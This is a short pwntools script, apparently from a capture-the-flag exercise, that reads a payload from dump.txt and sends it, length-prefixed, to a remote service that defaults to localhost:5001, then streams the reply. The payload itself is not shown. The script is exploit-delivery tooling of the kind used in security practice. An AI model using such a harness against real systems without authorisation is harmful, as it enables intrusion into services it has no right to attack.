from pwn import *
from pathlib import Path

payload = Path("dump.txt").read_bytes()

r = remote(args.HOST or "localhost", args.PORT or 5001)
r.send(p64(len(payload)))
r.send(payload)
r.stream()
